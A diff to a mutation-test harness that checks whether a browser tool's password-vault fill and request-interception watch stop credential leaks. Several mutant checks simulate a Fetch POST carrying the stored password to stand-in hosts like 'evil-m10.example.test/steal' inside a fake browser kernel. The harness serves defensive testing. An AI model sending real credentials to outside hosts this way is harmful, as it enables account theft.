@@ -18,6 +18,7 @@ import { startFakeKernel } from './fixtures/fake-kernel.mjs';
 import { runR28LoginNails } from './fixtures/r28-login-nails.mjs';
 import { runR29LoginNails } from './fixtures/r29-login-nails.mjs';
 import { runR30LoginNails } from './fixtures/r30-login-nails.mjs';
+import { markTimedOut } from './lib/timed-out.mjs';
 
 // B-21cc (the coordinator's r2491): a vault fill acts on the session's CURRENT tab, which the keeper reads from the session's own
 // `tab list` (the row marked active). These worlds have no driver session, so each watch made here gets a keeper whose
@@ -47,6 +48,19 @@ const BK = require(path.join(REPO, 'src/server/browser-keeper.js'));
 const Lm = require(path.join(REPO, 'src/server/browser-logins.js'));
 const Dm = require(path.join(REPO, 'src/server/browser-dialogs.js'));
 const LF = (() => { try { return require(path.join(REPO, 'src/server/browser-login-fill.js')); } catch { return null; } })();
+// THE FLAKE CENSUS, ROUND 2 (主开发 r4456, lane bl-loop-b): a mutant's red that waited a CLOCK for its own CDP effect waits for the
+// effect itself (at the kernel, at the watch) under a generous bound; a bound that runs out is SAID by the tree's one mark
+// (scripts/lib/timed-out.mjs) on its own line right above the judge, which reads as before. heldSends(): the tree's own socket with
+// the named methods HELD off the wire until release() — the late thing, held at will
+const WSClient = require(path.join(REPO, 'node_modules/ws')).WebSocket;
+const untilFact = async (read, what, ms = 15000) => { const t0 = Date.now(); for (;;) { const v = await read(); if (v) return v; if (Date.now() - t0 > ms) return markTimedOut(v, ms, what); await new Promise((r) => setTimeout(r, 5)); } };   // (a read may be async: it is awaited)
+function heldSends(methods) {
+  const held = []; let holding = false;
+  class HeldWS extends WSClient {
+    send(d, ...a) { let m = null; try { m = JSON.parse(String(d)).method; } catch { /* not a call */ } if (holding && methods.includes(m)) { held.push({ method: m, go: () => super.send(d, ...a) }); return undefined; } return super.send(d, ...a); }
+  }
+  return { Impl: HeldWS, held, hold() { holding = true; }, release() { holding = false; for (const h of held.splice(0)) h.go(); } };
+}
 const Rm = require(path.join(REPO, 'src/routes/browser.js'));
 const VRm = require(path.join(REPO, 'src/routes/vault.js'));
 
@@ -1953,7 +1967,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
       wsM1.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
     });
     await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
-    for (let i = 0; i < 30 && !sidM1; i++) await new Promise((r) => setTimeout(r, 5));
+    await untilFact(() => sidM1, 'MUTANT 1: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms
 
     const realPhish = await LF.fillVaultElement({
       call: (m, p) => sendCdp(m, p, sidM1), browserCall: (m, p) => sendCdp(m, p),
@@ -2010,7 +2024,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
       wsM3.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
     });
     await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
-    for (let i = 0; i < 30 && !sidM3; i++) await new Promise((r) => setTimeout(r, 5));
+    await untilFact(() => sidM3, 'MUTANT 3: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms
 
     const realUnmasked = await LF.fillVaultElement({
       call: (m, p) => sendCdp(m, p, sidM3), browserCall: (m, p) => sendCdp(m, p),
@@ -2149,16 +2163,8 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         // written by NAMED notes — B's first, A's last: the conversation's newest snapshot is A's, so only a fill that LEAVES the
         // tab it acts on (B) for the tab holding the reference (A) types there (the product refuses B's fill by name: a moved tab)
         const parseM7 = require(path.join(REPO, 'src/browser-verbs.js')).parseSnapshotRefs;
-        for (let i = 0; i < 20; i++) {
-          const nsB = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Search" [ref=e1]'), targetId: tidB2 });
-          if (nsB && nsB.ok && nsB.count === 1) break;
-          await new Promise((r) => setTimeout(r, 10));
-        }
-        for (let i = 0; i < 20; i++) {
-          const nsA = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]'), targetId: tidA });
-          if (nsA && nsA.ok && nsA.count === 2) break;
-          await new Promise((r) => setTimeout(r, 10));
-        }
+        await untilFact(async () => { const nsB = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Search" [ref=e1]'), targetId: tidB2 }); return !!(nsB && nsB.ok && nsB.count === 1); }, 'MUTANT 7: tab B\'s snapshot noted');   // the flake census r2: was 20 × 10 ms
+        await untilFact(async () => { const nsA = await w7.noteSnapshot({ profileId: 'bp-m7', browserKey: 'bk-m' }, { parsedRefs: parseM7('- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]'), targetId: tidA }); return !!(nsA && nsA.ok && nsA.count === 2); }, 'MUTANT 7: tab A\'s snapshot noted');
         const r7 = await w7.fillVaultField({ profileId: 'bp-m7', browserKey: 'bk-m' }, { targetId: tidB2, target: '@e2', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-m7'] } });
         ok(Boolean(r7 && r7.ok) && fkM.readDomValues(tidA).pw === 'AliceMut!12345678',
           'MUTANT 7 RED (L4 cross-tab-ref-fallback): falling back to background tab snapshotRefs types secret into background tab A',
@@ -2222,7 +2228,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         wsM8.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
       });
       await sendCdp('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
-      for (let i = 0; i < 30 && !sidM8; i++) await new Promise((r) => setTimeout(r, 5));
+      await untilFact(() => sidM8, 'MUTANT 8: the page\'s auto-attached session');   // the flake census r2: was 30 × 5 ms
 
       const realL5 = await LF.fillVaultElement({
         call: (m, p) => sendCdp(m, p, sidM8), browserCall: (m, p) => sendCdp(m, p),
@@ -2339,15 +2345,39 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
 
       // Judge M10 (N1 hold relaxes wantCred)
       if (BD_M10) {
-        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }, { id: 'big', tag: 'textarea', type: 'textarea', name: 'Big', value: 'x'.repeat(2400) }] });
-        const w10 = BD_M10.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24, wipeMaxScanPositions: 256 });
-        await w10.arm('bp-m10');
-        w10.noteActiveTab({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, tidR24);
-        await w10.fillVaultField({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
-        await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
-        await new Promise((r) => setTimeout(r, 40));
+        const dom10 = () => fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }, { id: 'big', tag: 'textarea', type: 'textarea', name: 'Big', value: 'x'.repeat(2400) }] });
+        const make10 = (extra = {}) => BD_M10.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24, wipeMaxScanPositions: 256, ...extra });
+        const fill10 = async (w, pid) => { await w.arm(pid); w.noteActiveTab({ profileId: pid, browserKey: 'bk-mr24' }, tidR24); await w.fillVaultField({ profileId: pid, browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } }); };
+        const submit10 = () => fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
+        const fetchModeSince = (m) => fkR24.calls().filter((c) => c.seq > m && c.tab === tidR24 && (c.method === 'Fetch.enable' || c.method === 'Fetch.disable'));
+        // the flake census r2's find: the copy sends its relaxed Fetch mode only AFTER the paused fetch is answered, and the 40 ms after
+        // the first submit was a guess that it had reached the kernel. PLACED (at will), on a watch of its own: that send HELD off the
+        // wire, the leg as it stood (40 ms, then the foreign POST) reads the copy's red away — the POST is still intercepted
+        {
+          dom10();
+          const hs10 = heldSends(['Fetch.enable', 'Fetch.disable']);
+          const w10p = make10({ WebSocketImpl: hs10.Impl });
+          await fill10(w10p, 'bp-m10p');
+          hs10.hold();
+          await submit10();
+          await new Promise((r) => setTimeout(r, 40));   // the leg as it stood
+          const heldLeak = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10p.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
+          const heldMode = await untilFact(() => hs10.held.length > 0, 'MUTANT 10 PLACED: the copy\'s relaxed Fetch mode reached the hold');
+          const heldN = hs10.held.length;
+          const m10p = fkR24.mark(); hs10.release();
+          await untilFact(() => fetchModeSince(m10p).length >= heldN, 'MUTANT 10 PLACED: the released mode at the kernel');
+          ok(!!heldMode && heldN >= 1 && heldLeak.action !== 'unwatched', 'PLACED (MUTANT 10, the census\'s find at will): the copy\'s relaxed Fetch mode HELD off the wire — the leg as it stood (40 ms after the first submit) sends the foreign POST into a kernel that still intercepts it, and the copy\'s red reads away', { heldN, heldLeak });
+          w10p.shutdown();
+          await untilFact(() => (fkR24.targets().find((t) => t.targetId === tidR24) || {}).attached === false, 'MUTANT 10 PLACED: the placement\'s session gone from the tab');
+        }
+        dom10();
+        const w10 = make10();
+        await fill10(w10, 'bp-m10');
+        const m10 = fkR24.mark();
+        await submit10();
+        await untilFact(() => fetchModeSince(m10).length > 0, 'MUTANT 10: the copy\'s relaxed Fetch mode (its Fetch.enable / Fetch.disable after the hold) at the kernel');
         const leak10 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
-        ok(leak10.action === 'unwatched', 'MUTANT 10 RED (N1 hold-relaxes-fetch): relaxing wantCred on holdReason lets foreign Fetch bypass interception', leak10);
+        ok(leak10.action === 'unwatched', 'MUTANT 10 RED (N1 hold-relaxes-fetch): relaxing wantCred on holdReason lets foreign Fetch bypass interception', { leak10, modeHeard: fetchModeSince(m10).map((c) => c.method) });
         w10.shutdown();
       } else ok(false, 'MUTANT 10 RED (N1a): anchor not found');
 
@@ -2360,11 +2390,11 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         w11.noteActiveTab({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, tidR24);
         await w11.fillVaultField({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         holdersM = [{ browserKey: 'bk-h', human: true, input: 'user' }];
+        const m11 = fkR24.mark();
         await w11.arm('bp-m11');
-        await new Promise((r) => setTimeout(r, 25));
+        await untilFact(() => fkR24.calls().some((c) => c.seq > m11 && c.tab === tidR24 && c.method === 'Fetch.disable'), 'MUTANT 11: the copy\'s raw Fetch.disable at the person\'s flip, at the kernel');   // the flake census r2: was a 25 ms guess
         holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
-        await w11.arm('bp-m11');
-        await new Promise((r) => setTimeout(r, 25));
+        await w11.arm('bp-m11');   // (the flip back's 25 ms guarded nothing: arm waits for its own move, and either word the copy leaves at the kernel — the person's Fetch.disable, its armPrompts' Document-only enable — leaves a Fetch POST unwatched)
         const leak11 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m11.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
         ok(leak11.action === 'unwatched', 'MUTANT 11 RED (N1 toPerson-bypasses-sync): stale fetchMode after agent->person->agent leaves foreign Fetch unwatched', leak11);
         w11.shutdown();
@@ -2380,7 +2410,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         await w12.arm('bp-m12');
         const m0 = fkR24.mark();
         await w12.noteSnapshot({ profileId: 'bp-m12', browserKey: 'bk-mr24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'row 0', nth: 0 }], targetId: tidR24 });
-        await new Promise((r) => setTimeout(r, 30));
+        await untilFact(() => evs12.some((x) => x.kind === 'down') && fkR24.calls().some((c) => c.seq > m0 && c.method === 'Accessibility.getFullAXTree'), 'MUTANT 12: the copy\'s getFullAXTree at the kernel and the watch dropped');   // the flake census r2: was a 30 ms guess
         const ax12 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Accessibility.getFullAXTree').length;
         const down12 = evs12.some((x) => x.kind === 'down');
         ok(ax12 >= 1 && down12 === true, 'MUTANT 12 RED (N2 snapshot-full-ax-on-watch): getFullAXTree on snapshot calls Accessibility.* and drops watch (1009) on 3,000-row page', { ax12, down12 });
@@ -2406,10 +2436,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         const m0 = fkR24.mark();
         await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
-        for (let i = 0; i < 40; i++) {
-          if (w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok) break;
-          await new Promise((r) => setTimeout(r, 10));
-        }
+        await untilFact(() => w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok, 'MUTANT 14: the fence lifted');   // the flake census r2: was 40 × 10 ms (a lift that never came read «no Network.disable» for the copy's red)
         const netDis14 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Network.disable').length;
         ok(netDis14 === 0, 'MUTANT 14 RED (m2 network-never-disabled): without Network.disable on fence lift, Network domain stays enabled forever', { netDis14 });
         w14.shutdown();
@@ -2911,7 +2938,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             await LF_M21.resolveSnapshotRef({
               wsUrl: `ws://127.0.0.1:${dp}`, call: watchCall, targetId: 'T-1', frameTree: ftStub, parsedRef: refDesc, timeoutMs: 400,
             });
-            await new Promise((r) => setTimeout(r, 40));
+            await untilFact(() => standingWatch.readyState === 3 && closeCode !== 0, 'MUTANT 21: the standing watch closed');   // the flake census r2: was a 40 ms guess
             ok(watchAxCalls === 1 && standingWatch.readyState === 3 && closeCode === 1006,
               'MUTANT 21 RED (A3 short-socket-falls-back-to-watch): falling back to standing watch sends queryAXTree over watch and 16.71 MiB reply drops watch with code 1006',
               { watchAxCalls, watchState: standingWatch.readyState, closeCode });
